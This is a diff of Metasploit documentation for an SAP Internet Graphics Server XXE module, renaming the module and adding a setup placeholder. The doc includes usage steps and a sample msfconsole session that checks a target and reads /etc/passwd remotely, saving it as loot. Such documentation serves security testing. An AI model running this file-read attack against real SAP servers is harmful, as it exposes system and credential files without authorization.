@@ -18,6 +18,7 @@ dynamic graphical or non-graphical output.
 4. XXXX ??? At this point I couldn't download any software as none of the download pages are accessible.
    I think you need a paid subscription to access them.
 
+XXX - Need to add setup instruction here....
 SAP IGS versions: 7.20, 7.20EXT, 7.45, 7.49, 7.53 are affected by this vulnerability.
 Installing and Updating the IGS [instructions][2].
 Configuring the IGS [instructions][3].
@@ -29,7 +30,7 @@ Once set up and configured, the instances will be vulnerable on the default HTTP
 
   1. Start msfconsole
   1. Do: `workspace [WORKSPACE]`
-  1. Do: `use auxiliary/admin/sap/sap_igs_xxe`
+  1. Do: `use auxiliary/admin/sap/sap_igs_xmlchart_xxe`
   1. Do: `set RHOSTS [IP]`
   1. Do: `set FILE [remote file name]`
   1. Do: `set SHOW [true|false]`
@@ -68,18 +69,18 @@ set to `/igs/XMLCHART`.
 msf6 > workspace -a SAP_TEST
 [*] Added workspace: SAP_TEST
 [*] Workspace: SAP_TEST
-msf6 > use auxiliary/admin/sap/sap_igs_xxe
-msf6 auxiliary(admin/sap/sap_igs_xxe) > set RHOSTS 10.10.10.10
+msf6 > use auxiliary/admin/sap/sap_igs_xmlchart_xxe
+msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > set RHOSTS 10.10.10.10
 RHOSTS => 10.10.10.10
-msf6 auxiliary(admin/sap/sap_igs_xxe) > set FILE /etc/passwd
+msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > set FILE /etc/passwd
 FILE => /etc/passwd
-msf6 auxiliary(admin/sap/sap_igs_xxe) > set action READ
+msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > set action READ
 action => READ
-msf6 auxiliary(admin/sap/sap_igs_xxe) > set Proxies http:127.0.0.1:8080
+msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > set Proxies http:127.0.0.1:8080
 Proxies => http:127.0.0.1:8080
-msf6 auxiliary(admin/sap/sap_igs_xxe) > options
+msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > options
 
-Module options (auxiliary/admin/sap/sap_igs_xxe):
+Module options (auxiliary/admin/sap/sap_igs_xmlchart_xxe):
 
    Name     Current Setting      Required  Description
    ----     ---------------      --------  -----------
@@ -100,9 +101,9 @@ Auxiliary action:
    READ  Remote file read
 
 
-msf6 auxiliary(admin/sap/sap_igs_xxe) > check
+msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > check
 [+] 10.10.10.10:40080 - The target is vulnerable. OS info: SUSE Linux Enterprise Server for SAP Applications 12 SP1
-msf6 auxiliary(admin/sap/sap_igs_xxe) > run
+msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > run
 [*] Running module against 10.10.10.10
 
 [+] File: /etc/passwd content from host: 10.10.10.10
@@ -141,7 +142,7 @@ sapadm:x:1002:1001:SAP System Administrator:/home/sapadm:/bin/false
 
 [+] File: /etc/passwd saved in: /Users/vladimir/.msf4/loot/20200929135102_SAP_TEST_10.10.10.10_sap.igs.xxe_302025.txt
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/sap/sap_igs_xxe) > services
+msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > services
 Services
 ========
 
@@ -149,7 +150,7 @@ host         port   proto  name  state  info
 ----         ----   -----  ----  -----  ----
 10.10.10.10  40080  tcp    http  open   SAP Internet Graphics Server (IGS); OS info: SUSE Linux Enterprise Server for SAP Applications 12 SP1
 
-msf6 auxiliary(admin/sap/sap_igs_xxe) > vulns
+msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > vulns
 
 Vulnerabilities
 ===============
@@ -158,7 +159,7 @@ Timestamp                Host         Name                                    Re
 ---------                ----         ----                                    ----------
 2020-09-29 10:51:01 UTC  10.10.10.10  SAP Internet Graphics Server (IGS) XXE  CVE-2018-2392,CVE-2018-2393,URL-https://download.ernw-insight.de/troopers/tr18/slides/TR18_SAP_IGS-The-vulnerable-forgotten-component.pdf
 
-msf6 auxiliary(admin/sap/sap_igs_xxe) > loot
+msf6 auxiliary(admin/sap/sap_igs_xmlchart_xxe) > loot
 
 Loot
 ====
